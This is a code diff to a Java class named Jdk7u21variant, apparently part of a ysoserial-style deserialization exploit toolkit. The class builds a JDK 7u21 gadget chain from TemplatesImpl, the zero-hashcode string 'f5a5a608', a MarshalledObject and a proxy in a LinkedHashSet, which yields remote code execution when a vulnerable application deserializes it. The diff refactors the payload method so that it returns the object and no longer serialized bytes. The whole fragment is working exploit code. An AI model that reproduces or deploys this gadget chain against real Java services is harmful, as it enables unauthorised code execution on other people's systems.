@@ -14,7 +14,7 @@ import java.util.LinkedHashSet;
 
 public class Jdk7u21variant implements ObjectPayload<Object>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object templates = Gadgets.createTemplatesImpl(type, param);
         String zeroHashCodeStr = "f5a5a608";
 
@@ -41,19 +41,6 @@ public class Jdk7u21variant implements ObjectPayload<Object>{
         set.add(marshalledObject);
         set.add(proxy);
         map.put(zeroHashCodeStr, marshalledObject); // swap in real object
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(set);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return set;
     }
 }
